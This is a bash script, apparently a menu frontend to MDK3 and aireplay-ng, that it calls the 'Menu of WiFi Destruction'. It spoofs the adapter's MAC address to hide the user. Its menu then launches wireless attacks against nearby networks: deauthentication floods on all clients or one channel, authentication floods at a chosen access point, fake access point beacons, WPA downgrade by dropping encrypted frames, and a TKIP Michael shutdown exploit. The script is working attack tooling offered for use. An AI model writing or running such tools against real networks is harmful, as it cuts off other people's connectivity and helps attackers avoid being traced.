#!/bin/bash
# A Frontend To MDK3

interface=wlan0mon
monitor=wlan0mon

<<OHO
if [ $UID -ne 0 ]
then
echo "You are not root!! type "sudo su" and then run this script"
spd-say -t female2 run_the_script_as_root
exit
else

#INSTALL TO SYSTEM
if [ "$1" = "install" ]  
then
#cp $0 /bin/$2
zenity --info --text="INSTALLED TO /BIN. CALL IT BY TYPING"$2
fi

<<MO

#UNBLOCK DEVICES
echo -e "\n\nUnblocking all Devices if any\n"
spd-say -t female2 unblocking_devices
sleep 2
rfkill unblock all

#START MONITOR MODE
spd-say -t female2 checking_promiscous_mode_support
airmon-ng start $interface | grep mon
echo -e "$(tput setaf 2)$(tput bold)\nIf it says \"monitor mode enabled on monx\" then u r good to go, else the your card aint supported.$(tput sgr0)"
sleep 10

#CHANGE MAC-ADDRESS, HIDE YOUR ASS!
spd-say -t female2 setting_devices_down
echo -e "\n\n CHANGING ADAPTER MAC \n\n"
sleep 2
ifconfig $interface down
ifconfig $monitor down    


spd-say -t female2 changing_adapter_mac
macchanger -m AA:BB:CC:DD:EE:FF $interface
macchanger -m AA:BA:CA:DA:EA:FA $monitor
sleep 2

spd-say -t female2 putting_interface_up
ifconfig $interface up
ifconfig $monitor up
sleep 2


echo -e "\n\nSCANNING AVAILABLE NETWORKS"
spd-say -t female2 scaning_available_networks
sleep 2

xterm -bg black -fg orange -e airodump-ng $monitor &

fi
OHO

xterm -bg black -fg orange -e airodump-ng $monitor &

function menu()
{
echo "$(tput clear)"
cat << EOF
 __      __.__  _____.__       ____.                                    
/  \    /  \__|/ ____\__|     |    |____    _____   _____   ___________ 
\   \/\/   /  \   __\|  |     |    \__  \  /     \ /     \_/ __ \_  __ \
 \        /|  ||  |  |  | /\__|    |/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
  \__/\  / |__||__|  |__| \________(____  /__|_|  /__|_|  /\___  >__|   
       \/                               \/      \/      \/     \/       

EOF
echo  "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃"
echo -e "\n\n\t\t\t $(tput bold) $(tput blink)***MENU OF WIFI DESTRUCTION (MWD)***$(tput sgr 0)\t\t\t\t\t  \n\n"
#echo -e "\t $(tput setaf 3)It is advisable to run only a single instance as it may harm your adapter\t\t    \n\n"
echo  -e "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\n\n"
echo -e "$(tput bold)\t\t\t1\t Deauth(Disconnect) clients $(tput sgr0)"
echo -e " $(tput setaf 4)$(tput bold)\n\t\t\t2\t Auth Flood Attack$(tput sgr0)"
echo -e " $(tput setaf 5)$(tput bold)\n\t\t\t3\tShow Random Fake AP at Clients$(tput sgr0)"
echo -e " $(tput setaf 6)$(tput bold)\n\t\t\t4\tWPA Downgrade$(tput sgr0)"
echo -e " $(tput setaf 7)$(tput bold)\n\t\t\t5\tMichael shutdown exploitation (TKIP)$(tput sgr0)"
echo -e " $(tput setaf 6)$(tput bold)\n\t\t\t6\tDeauth with aireplay-ng$(tput sgr0)\n"
echo -e "$(tput bold)\t\t\t7\tQUIT!!"

echo -en "\n\n$(tput setab 2)WHAT DO YA WAN'??$(tput sgr0)\t"



read choice 
echo "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃"

if [ $choice -eq 1 ]
then
   echo -e "\n\n$(tput bold)1\tDeauth All\n"
   echo -e "2\t$(tput bold) $(tput setaf 3)Deauth Single Channel\n"
   echo -e "$(tput bold)3\tBACK..\n$(tput sgr0)"
   echo -en "$(tput bold)Enter the choice \t"

read internal

if [ $internal -eq 1 ]
then
xterm -T DEAUTH_ALL -bg red -fg white -e mdk3 $monitor d &
menu

elif [ $internal -eq 2 ]
then
chan=$(zenity --entry --text="The Channel number of target Wifi from airmon window")
xterm -T DEAUTH_CLIENT -bg black -fg red -e mdk3 $monitor d -c $chan &
echo "ATTACK IS RUNNING!!"
spd-say attacking_channel_$chan
menu

elif [ $internal -eq 3 ]
then
menu

else
echo -e "$(tput bold)INVALID CHOICE DUMBO!!\n\n"
spd-say -t female2 this_is_not_an_option
exit
fi

#FAKE AUTH

elif [ $choice -eq 2 ]
then
fake=$(zenity --entry --text="Enter the BSSID (MAC) of AP")
echo -e "\n\n$(tput bold) SENDING FAKE AUTH FRAMES!"
spd-say sending_fake_auth_frames
xterm -T FAKING_AUTHENICATION -fg purple -bg white -e mdk3 $monitor a -a $fake -m & 

menu

#FAKE AP RANDOM

elif [ $choice -eq 3 ]
then
echo -e "\n\n$(tput bold) GENERATING RANDOM AP's"
spd-say fake_ap_generation_in_progress
xterm -T RANDOM_AP -fg white -bg black -e mdk3 $monitor b -m &

menu

#WPA DOWNGRADE
elif [ $choice -eq 4 ]
then
bssid=$(zenity --entry --text="Enter the Bssid (MAC) of the AP")
echo -e "\n\n$(tput bold) REMOVING WPA FRAMES"
spd-say removing_encrypted_packets
xterm -T REMOVING_WPA -fg pink -bg black -e mdk3 $monitor g -t $bssid &

menu

#TKIP EXPLOIT

elif [ $choice -eq 5 ]
then
bssid=$(zenity --entry --text="Enter the Bssid (MAC) of the AP\n")
echo -e "\n\n$(tput bold) RUNNING EXPLOIT"
spd-say exploiting_client
xterm -T RUNNING_EXPLOIT -fg black -bg green -e mdk3 $monitor m -t $bssid -j &
menu


elif [ $choice -eq 6 ]
then
bssid=$(zenity --entry --text="Enter the BSSID")
no=$(zenity --entry --text="Enter the number of deauth frames to send")
#xterm -T DEAUTH_CLIENT -bg black -fg red -e aireplay-ng -0 $no -a $bssid $monitor  &
xterm -T DEAUTH_CLIENT -bg black -fg red -e aireplay-ng -0 $no -a $bssid --ignore-negative-one $monitor  &
echo aireplay-ng -0 $no -a $bssid $monitor 
spd-say deauth_in_progress
menu

else
killall airodump-ng
echo "$(tput bold) SEE YA!"
spd-say -t female2 bye
fi
exit
}
tput sgr0
menu
